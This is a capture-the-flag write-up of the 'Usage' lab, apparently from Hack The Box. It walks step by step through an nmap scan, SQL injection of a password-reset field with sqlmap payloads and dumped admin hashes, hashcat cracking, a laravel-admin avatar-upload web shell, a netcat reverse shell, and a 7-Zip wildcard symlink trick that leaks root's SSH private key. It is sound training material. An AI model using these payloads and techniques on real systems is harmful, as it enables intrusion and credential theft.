## Usage

### Lab Details 

- Difficulty: Easy  
- Type: Web App, SQLi, File Upload, Binary, Priv Esc, Linux

#### Tasks
Q1: How many open TCP ports are listening on Usage?
- run nmap `nmap -sT -T4 -vv -A -p- -Pn -oA Usage 10.10.11.18`
```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFfdLKVCM7tItpTAWFFy6gTlaOXOkNbeGIN9+NQMn89HkDBG3W3XDQDyM5JAYDlvDpngF58j/WrZkZw0rS6YqS0=
|   256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHr8ATPpxGtqlj8B7z2Lh7GrZVTSsLb6MkU3laICZlTk
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
```

Q2: What domain name is a subdomain of usage.htb that returns a different page than the default redirect to usage.htb?
- theres an admin page on the index page, when accessing the admin page we get the domain `admin.usage.htb`

Q3: What PHP web framework is the website written with?
- open wappalyzer plugin and it shows that website uses laravel backend framework

Q4: What is the HTTP POST parameter that is vulnerable to SQL injection?
- there are 3 POST requests on the site e.g. register, login and reset password page
- SQLi is with reset password and the vulnerable parameter is email 
- use burpsuite to capture the post request and you can test for SQLi by appending SQLi to end of different parameters

Q5: How many tables are in the usage_blog database?
- we can use sqlmap to dump tables and found 15 tables in usage_blog database
```
$ sqlmap -r password-reset.post --level 5 --risk 3 -p email --dump
        ___
       __H__                                                                                                        
 ___ ___[)]_____ ___ ___  {1.9.2#stable}                                                                            
|_ -| . [']     | .'| . |                                                                                           
|___|_  [,]_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:58:49 /2025-06-10/

[16:58:49] [INFO] parsing HTTP request from 'password-reset.post'
[16:58:49] [INFO] resuming back-end DBMS 'mysql' 
[16:58:49] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] 

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=pwPSH9PYYydyV1ybJb8mzQlJzVD9dRW5TqmZtZaU&email=123@123.com' AND 4216=(SELECT (CASE WHEN (4216=4216) THEN 4216 ELSE (SELECT 5741 UNION SELECT 4571) END))-- wMrs

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: _token=pwPSH9PYYydyV1ybJb8mzQlJzVD9dRW5TqmZtZaU&email=123@123.com' AND 2221=BENCHMARK(5000000,MD5(0x76786f71))-- NICD

<snip>
usage_blog
[17:00:01] [INFO] fetching tables for database: 'usage_blog'
[17:00:01] [INFO] fetching number of tables for database 'usage_blog'
[17:00:01] [INFO] retrieved: 15
<snip>
```
Q6: What is the admin user's password to the admin website?
- we can dump the password using sqlmap

```
$: sqlmap -r password-reset.post --level 5 --risk 3 -p email  -D usage_blog -T admin_users --dump
        ___
       __H__                                                                                                        
 ___ ___[']_____ ___ ___  {1.9.2#stable}                                                                            
|_ -| . [.]     | .'| . |                                                                                           
|___|_  [,]_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:27:43 /2025-06-10/

[17:27:43] [INFO] parsing HTTP request from 'password-reset.post'
[17:27:43] [INFO] resuming back-end DBMS 'mysql' 
[17:27:43] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] 

redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] 

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=pwPSH9PYYydyV1ybJb8mzQlJzVD9dRW5TqmZtZaU&email=123@123.com' AND 4216=(SELECT (CASE WHEN (4216=4216) THEN 4216 ELSE (SELECT 5741 UNION SELECT 4571) END))-- wMrs

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: _token=pwPSH9PYYydyV1ybJb8mzQlJzVD9dRW5TqmZtZaU&email=123@123.com' AND 2221=BENCHMARK(5000000,MD5(0x76786f71))-- NICD
---
[17:27:50] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL < 5.0.12
[17:27:50] [INFO] fetching columns for table 'admin_users' in database 'usage_blog'
[17:27:50] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[17:27:50] [INFO] retrieved: 
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] 

8
[17:27:57] [INFO] retrieved: id
[17:28:10] [INFO] retrieved: username
[17:28:57] [INFO] retrieved: password
[17:29:50] [INFO] retrieved: name
[17:30:14] [INFO] retrieved: avatar
[17:30:47] [INFO] retrieved: remember_token
[17:32:17] [INFO] retrieved: created_at
[17:33:19] [INFO] retrieved: updated_at
[17:34:28] [INFO] fetching entries for table 'admin_users' in database 'usage_blog'
[17:34:28] [INFO] fetching number of entries for table 'admin_users' in database 'usage_blog'
[17:34:28] [INFO] retrieved: 1
[17:34:31] [INFO] retrieved: Administrator
[17:35:50] [INFO] retrieved: 
[17:35:51] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
[17:36:42] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[17:36:46] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[17:36:46] [INFO] retrieved: 2023-08-13 02:48:26
[17:38:57] [INFO] retrieved: 1
[17:39:02] [INFO] retrieved: $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
[17:46:38] [INFO] retrieved: kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT
[17:54:04] [INFO] retrieved: 2023-08-23 06:02:19
[17:56:22] [INFO] retrieved: admin
Database: usage_blog
Table: admin_users
[1 entry]
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
<snip>
```
- the $2y$10 is Bcrypt hash, search online or use website https://www.dcode.fr/crypt-hashing-function to identify
- we can use hashcat to crack it
```
$ hashcat --help | grep bcrypt
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

─(kali㉿kali)-[~/…/WriteUps/Easy/Unix/Usage]
└─$ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt          

hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) Ultra 7 155H, 2913/5890 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Initializing backend runtime for device #1. Please be patient...

Host memory required for this attack: 0 MB


Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => 


Session..........: hashcat
Status...........: Running
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH...fUPrL2
Time.Started.....: Tue Jun 10 18:02:18 2025 (20 secs)
Time.Estimated...: Fri Jun 13 00:03:03 2025 (2 days, 6 hours)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       74 H/s (6.28ms) @ Accel:4 Loops:32 Thr:1 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 1472/14344385 (0.01%)
Rejected.........: 0/1472 (0.00%)
Restore.Point....: 1472/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:352-384
Candidate.Engine.: Device Generator
Candidates.#1....: maurice -> marlene
Hardware.Mon.#1..: Util: 88%


$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1
```
Q7: What PHP package is responsible for the admin panel?
- after login to the admin page with admin : whatever1, we can see a dependencies called `encore/laravel-admin`

Q8: What is the 2023 CVE ID for an arbitrary file upload vulnerability that leads to remote code execution in this version of Laravel-Admin?
- search online for `encore/laravel-admin 1.8.18 exploit` found https://www.cvedetails.com/cve/CVE-2023-24249/

Q9: What user is the webserver running as on Usage?
- after searching the admin panel, there is a profile page for current user which we can upload a different avatar image
- http://admin.usage.htb/admin/auth/setting
- the form only accepts image files, tried to delete front end javascript however unable to upload a web shell
- tried uploading web shell with png extension and worked
- inspecting the upload shell in dev tool also shows the uploaded URL
- Ive referenced this blog for the detail of the attack `https://flyd.uk/post/cve-2023-24249/`
- ![[Pasted image 20250611010236.png]]
- we can call a reverse shell from the webshell
- generate the payload using https://www.revshells.com/
- ![[Pasted image 20250611010407.png]]

```
$ nc -lnvp 4444                                    
listening on [any] 4444 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.11.18] 57854
sh: 0: can't access tty; job control turned off
$ whoami
dash

```


Q11: What is the xander user's password on Usage?
- run linpeas.sh unable to locate anything 
- found the password in dash's home directory
```
$ cat /home/dash/.monitrc
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd
<snip>
```

Q12: What is the full path of the file that xander can run as any user without a password on Usage?
- after we have retrieved the password we can ssh into target with `xander : 3nc0d3d_pa$$w0rd`
- run sudo -l 
```
xander@usage:/var/www/html$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

Q13: Which option in usage_management invokes 7Zip?
- we can try running the binary as sudo we get below menu and selecting `1` will run 7zip to archive the contents in `var/www/html`
```
xander@usage:/var/www/html$ sudo /usr/bin/usage_management 
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7313 16-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--       
Path = /var/backups/project.zip
Type = zip
Physical Size = 54827620
```

Q14: What is the full command line for 7Zip when it is invoked by usage_management?
- we can use `strings` to view the plaintext of binary file 
```
<snip>
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
<snip>
```
Q15: What is the full path to the root user's private SSH key?`
- to exploit the 7zip wildcard, ive referenced `https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#id-7z`
- basically we will need to create a link file to the target file that we want to read and place it into the source directory that 7zip is going to archive
- we can target the root.txt directly or the private ssh key of the root user
- example below
```
ander@usage:/var/www/html$ touch @root.txt
xander@usage:/var/www/html$ ln -s /root/root.txt root.txt
xander@usage:/var/www/html$ ls -l
total 8
drwxrwxr-x 13 dash   dash   4096 Apr  2  2024 project_admin
-rw-rw-r--  1 xander xander    0 Jun 11 04:37 @root.txt
lrwxrwxrwx  1 xander xander   14 Jun 11 04:38 root.txt -> /root/root.txt
drwxrwxr-x 12 dash   dash   4096 Apr  2  2024 usage_blog
xander@usage:/var/www/html$ sudo /usr/bin/usage_management 
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7313 16-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--       
Path = /var/backups/project.zip
Type = zip
Physical Size = 54827337

Scanning the drive:
          
WARNING: No more files
7e81b44a2b0aef0f6447db754ad4ec85

2984 folders, 17947 files, 113843707 bytes (109 MiB)

Updating archive: /var/backups/project.zip

Items to compress: 20931

                                                                               
Files read from disk: 17947
Archive size: 54827479 bytes (53 MiB)

Scan WARNINGS for files and folders:

7e81b44a2b0aef0f6447db754ad4ec85 : No more files
----------------
Scan WARNINGS: 1
xander@usage:/var/www/html$ touch @id_rsa
xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
xander@usage:/var/www/html$ ls -l
total 8
-rw-rw-r--  1 xander xander    0 Jun 11 04:39 @id_rsa
lrwxrwxrwx  1 xander xander   17 Jun 11 04:39 id_rsa -> /root/.ssh/id_rsa
drwxrwxr-x 13 dash   dash   4096 Apr  2  2024 project_admin
lrwxrwxrwx  1 xander xander   14 Jun 11 04:38 root.txt -> /root/root.txt
drwxrwxr-x 12 dash   dash   4096 Apr  2  2024 usage_blog
xander@usage:/var/www/html$ sudo /usr/bin/usage_management 
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7313 16-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--       
Path = /var/backups/project.zip
Type = zip
Physical Size = 54827479

Scanning the drive:
          
WARNING: No more files
-----BEGIN OPENSSH PRIVATE KEY-----


WARNING: No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW


WARNING: No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi


WARNING: No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q


WARNING: No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs


WARNING: No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=


WARNING: No more files
-----END OPENSSH PRIVATE KEY-----

2984 folders, 17948 files, 113844106 bytes (109 MiB)

Updating archive: /var/backups/project.zip

Items to compress: 20932

                                                                               
Files read from disk: 17948
Archive size: 54827620 bytes (53 MiB)

Scan WARNINGS for files and folders:

-----BEGIN OPENSSH PRIVATE KEY----- : No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
-----END OPENSSH PRIVATE KEY----- : No more files
----------------
```

#### Resources

#### Lesson Learned
- 7 Zip wild card Priv Esc: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#id-7z
- Read binary in plaintext: https://www.howtogeek.com/427805/how-to-use-the-strings-command-on-linux/
